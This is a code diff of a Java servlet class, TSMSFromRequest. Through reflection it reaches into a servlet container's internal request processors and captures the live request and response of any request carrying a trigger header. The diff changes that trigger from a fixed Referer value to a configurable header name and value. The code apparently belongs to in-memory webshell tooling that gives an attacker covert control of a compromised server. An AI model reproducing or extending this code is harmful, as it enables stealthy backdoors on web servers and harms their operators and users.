@@ -31,7 +31,9 @@ public class TSMSFromRequest implements Servlet {
 
 	public static String pattern;
 
-	public static String referer;
+	public static String HEADER_KEY;
+
+	public static String HEADER_VALUE;
 
 	static {
 		getRequestAndResponse();
@@ -64,9 +66,9 @@ public class TSMSFromRequest implements Servlet {
 							for (int j = 0; j < processors.size(); ++j) {
 								Object processor = processors.get(j);
 								target = getFieldValue(processor, "req");
-								Object req        = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
-								String reqReferer = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, new String("Referer"));
-								if (reqReferer != null && !reqReferer.isEmpty() && reqReferer.equals(referer)) {
+								Object req   = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
+								String value = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, new String(HEADER_KEY));
+								if (value != null && value.contains(HEADER_VALUE)) {
 									request = (HttpServletRequest) req;
 									try {
 										response = (HttpServletResponse) getFieldValue(getFieldValue(req, "request"), "response");
